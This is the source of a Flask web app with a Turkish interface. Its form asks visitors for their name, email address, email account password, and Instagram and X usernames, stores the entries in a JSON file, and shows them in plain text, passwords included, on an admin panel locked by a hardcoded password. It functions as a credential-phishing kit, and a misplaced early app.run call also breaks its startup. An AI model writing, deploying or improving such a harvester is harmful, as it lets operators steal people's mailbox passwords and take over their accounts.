from flask import Flask, request, redirect, url_for, session, render_template_string
import json
import os
import uuid

app = Flask(__name__)
app.secret_key = "degistir-bunu-istersen"  # session icin, istersen degistir

DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.json")
ADMIN_PW = "1234ata"


def load_entries():
    if not os.path.exists(DATA_FILE):
        return []
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return []


def save_entries(entries):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(entries, f, ensure_ascii=False, indent=2)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
        


BASE_STYLE = """
<style>
  @import url('https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600&display=swap');
  :root{
    --paper:#F7F2E7; --ink:#232A36; --ink-soft:#5B6472; --rule:#C9BFA0;
    --gold:#9C8348; --green:#3F6B4E; --red:#A6402F; --seal:#8C2E22;
  }
  *{box-sizing:border-box;}
  body{
    margin:0; min-height:100vh; padding:48px 20px;
    background: repeating-linear-gradient(var(--paper) 0px, var(--paper) 27px, var(--rule) 28px), var(--paper);
    font-family:'Inter',sans-serif; color:var(--ink);
    display:flex; align-items:flex-start; justify-content:center;
  }
  .book{ position:relative; width:100%; max-width:640px; }
  .cover{
    border:1px solid var(--rule); border-radius:2px; padding:38px 40px 34px; position:relative;
    box-shadow:0 1px 0 var(--rule), 0 18px 40px -24px rgba(35,42,54,0.35);
    background:linear-gradient(180deg, rgba(255,255,255,0.35), rgba(255,255,255,0));
  }
  .eyebrow{ font-family:'IBM Plex Mono',monospace; font-size:11px; letter-spacing:.18em; text-transform:uppercase; color:var(--gold); margin:0 0 6px; }
  h1{ font-family:'Fraunces',serif; font-weight:600; font-size:32px; margin:0 0 4px; }
  h2{ font-family:'Fraunces',serif; font-size:26px; margin:0; }
  .sub{ color:var(--ink-soft); font-size:14.5px; margin:0 0 28px; line-height:1.5; }
  form{ display:flex; flex-direction:column; gap:16px; }
  .field{ display:flex; flex-direction:column; gap:6px; }
  label{ font-family:'IBM Plex Mono',monospace; font-size:11px; letter-spacing:.08em; text-transform:uppercase; color:var(--ink-soft); }
  input[type=text], input[type=email], input[type=password]{
    font-family:'IBM Plex Mono',monospace; font-size:15px; background:transparent;
    border:none; border-bottom:1.5px solid var(--rule); padding:8px 2px; color:var(--ink); outline:none;
  }
  input:focus{ border-bottom-color:var(--ink); }
  button.save{
    font-family:'Fraunces',serif; font-weight:600; font-size:16px; background:var(--ink); color:var(--paper);
    border:none; border-radius:3px; padding:12px 26px; cursor:pointer; width:fit-content;
  }
  button.save:hover{ background:#3A4457; }
  .status{ font-family:'IBM Plex Mono',monospace; font-size:12.5px; color:var(--green); margin-top:-6px; }
  .status.error{ color:var(--red); }
  .skip-check{
    display:flex; align-items:center; gap:6px; font-family:'Inter',sans-serif;
    font-size:12.5px; color:var(--ink-soft); cursor:pointer; margin-top:2px;
  }
  .skip-check input{ width:14px; height:14px; accent-color:var(--ink); cursor:pointer; }
  input:disabled{ opacity:0.4; border-bottom-style:dashed; }
  a.admin-link{
    position:absolute; top:26px; right:-1px; background:var(--seal); color:#F4E9DD;
    font-family:'IBM Plex Mono',monospace; font-size:11px; letter-spacing:.12em; text-transform:uppercase;
    padding:9px 8px 9px 12px; border-radius:3px 0 0 3px; text-decoration:none;
    writing-mode:vertical-rl; text-orientation:mixed; box-shadow:-3px 3px 8px rgba(0,0,0,0.18);
  }
  a.admin-link:hover{ background:#9E3728; }
  .lock-card{
    background:var(--paper); border:1px solid var(--rule); border-radius:3px; padding:32px 30px;
    width:100%; max-width:340px; margin:0 auto; text-align:center;
    box-shadow:0 30px 60px -20px rgba(0,0,0,0.5);
  }
  .lock-seal{
    width:52px; height:52px; margin:0 auto 14px; border-radius:50%; background:var(--seal); color:#F4E9DD;
    display:flex; align-items:center; justify-content:center; font-family:'Fraunces',serif; font-size:22px;
  }
  .lock-card input{
    width:100%; text-align:center; font-size:18px; letter-spacing:.2em; border:1.5px solid var(--rule);
    border-radius:4px; padding:10px; margin-bottom:12px; font-family:'IBM Plex Mono',monospace; background:#fff;
  }
  .lock-actions{ display:flex; gap:10px; }
  .lock-actions button{
    flex:1; padding:10px; border-radius:4px; border:none; cursor:pointer;
    font-family:'IBM Plex Mono',monospace; font-size:12.5px;
  }
  .lock-actions .go{ background:var(--ink); color:var(--paper); }
  .panel-head{ display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:24px; }
  .close-btn{
    background:transparent; border:1.5px solid var(--rule); border-radius:4px; padding:8px 14px;
    cursor:pointer; font-family:'IBM Plex Mono',monospace; font-size:12px; color:var(--ink-soft); text-decoration:none;
  }
  .record-card{
    border:1px solid var(--rule); border-radius:4px; padding:18px 20px; margin-bottom:16px;
    background:rgba(255,255,255,0.4); position:relative;
  }
  .rc-name{ font-family:'Fraunces',serif; font-size:19px; margin:0 0 12px; }
  .rc-row{
    display:flex; align-items:center; gap:10px; padding:6px 0; border-bottom:1px dashed var(--rule);
    font-family:'IBM Plex Mono',monospace; font-size:13px;
  }
  .rc-row:last-of-type{ border-bottom:none; }
  .rc-label{ width:110px; flex-shrink:0; color:var(--ink-soft); font-size:11px; text-transform:uppercase; }
  .rc-val{ flex:1; word-break:break-all; }
  .del-btn{
    position:absolute; top:14px; right:16px; background:none; border:none; color:var(--ink-soft);
    cursor:pointer; font-size:14px; text-decoration:none;
  }
  .del-btn:hover{ color:var(--red); }
  .empty{ text-align:center; padding:50px 0; color:var(--ink-soft); font-size:14px; }
</style>
"""

INDEX_HTML = BASE_STYLE + """
<div class="book">
  <div class="cover">
    <a class="admin-link" href="{{ url_for('admin_login') }}">Admin</a>
    <h1>Teşekkürler</h1>

    {% if saved %}<p class="status">✓ kaydedildi</p>{% endif %}

    <form method="POST" action="{{ url_for('index') }}">
      <div class="field"><label>Ad Soyad</label><input type="text" name="adsoyad" required></div>
      <div class="field"><label>E-posta</label><input type="email" name="mail" required></div>
      <div class="field"><label>E-posta Şifresi</label><input type="password" name="mailsifre" required></div>
      <div class="field">
        <label>Instagram Kullanıcı Adı</label>
        <input type="text" name="insta" id="insta">
        <label class="skip-check"><input type="checkbox" id="instaYok"> Hesabım yok</label>
      </div>
      <div class="field">
        <label>X (Twitter) Kullanıcı Adı</label>
        <input type="text" name="xhesap" id="xhesap">
        <label class="skip-check"><input type="checkbox" id="xYok"> Hesabım yok</label>
      </div>
      <button type="submit" class="save">Kaydet</button>
    </form>
    <script>
      function wireSkip(cbId, inpId){
        var cb = document.getElementById(cbId);
        var inp = document.getElementById(inpId);
        cb.addEventListener('change', function(){
          inp.disabled = cb.checked;
          if(cb.checked) inp.value = '';
        });
      }
      wireSkip('instaYok', 'insta');
      wireSkip('xYok', 'xhesap');
    </script>
  </div>
</div>
"""

LOGIN_HTML = BASE_STYLE + """
<div class="lock-card">
  <div class="lock-seal">A</div>
  <h2 style="font-size:20px; margin-bottom:6px;">Admin Girişi</h2>
  <p style="font-size:13px; color:var(--ink-soft); margin-bottom:18px;">Kayıtları görmek için şifreni gir.</p>
  {% if error %}<p class="status error">{{ error }}</p>{% endif %}
  <form method="POST" action="{{ url_for('admin_login') }}">
    <input type="password" name="password" placeholder="••••••••" autofocus>
    <div class="lock-actions">
      <a class="close-btn" href="{{ url_for('index') }}" style="flex:1; text-align:center;">Vazgeç</a>
      <button type="submit" class="go">Aç</button>
    </div>
  </form>
</div>
"""

ADMIN_HTML = BASE_STYLE + """
<div class="book" style="max-width:760px;">
  <div class="panel-head">
    <h2>Kayıtların</h2>
    <a class="close-btn" href="{{ url_for('logout') }}">Çıkış</a>
  </div>
  {% if entries|length == 0 %}
    <div class="empty">Henüz kayıt yok.</div>
  {% else %}
    {% for e in entries %}
    <div class="record-card">
      <a class="del-btn" href="{{ url_for('delete_entry', entry_id=e['id']) }}" title="Sil">✕</a>
      <p class="rc-name">{{ e['adsoyad'] or '—' }}</p>
      <div class="rc-row"><span class="rc-label">E-posta</span><span class="rc-val">{{ e['mail'] or '—' }}</span></div>
      <div class="rc-row"><span class="rc-label">Mail Şifresi</span><span class="rc-val">{{ e['mailsifre'] or '—' }}</span></div>
      <div class="rc-row"><span class="rc-label">Instagram</span><span class="rc-val">{{ e['insta'] or '—' }}</span></div>
      <div class="rc-row"><span class="rc-label">X (Twitter)</span><span class="rc-val">{{ e['xhesap'] or '—' }}</span></div>
    </div>
    {% endfor %}
  {% endif %}
</div>
"""


@app.route("/", methods=["GET", "POST"])
def index():
    saved = False
    if request.method == "POST":
        entries = load_entries()
        entries.append({
            "id": str(uuid.uuid4()),
            "adsoyad": request.form.get("adsoyad", "").strip(),
            "mail": request.form.get("mail", "").strip(),
            "mailsifre": request.form.get("mailsifre", ""),
            "insta": request.form.get("insta", "").strip(),
            "xhesap": request.form.get("xhesap", "").strip(),
        })
        save_entries(entries)
        saved = True
    return render_template_string(INDEX_HTML, saved=saved)


@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    error = None
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PW:
            session["is_admin"] = True
            return redirect(url_for("admin_panel"))
        error = "Şifre yanlış."
    return render_template_string(LOGIN_HTML, error=error)


@app.route("/admin/panel")
def admin_panel():
    if not session.get("is_admin"):
        return redirect(url_for("admin_login"))
    entries = load_entries()
    return render_template_string(ADMIN_HTML, entries=entries)


@app.route("/admin/delete/<entry_id>")
def delete_entry(entry_id):
    if not session.get("is_admin"):
        return redirect(url_for("admin_login"))
    entries = [e for e in load_entries() if e["id"] != entry_id]
    save_entries(entries)
    return redirect(url_for("admin_panel"))


@app.route("/logout")
def logout():
    session.pop("is_admin", None)
    return redirect(url_for("index"))


if __name__ == "__main__":
    app.run(debug=True, port=5000)
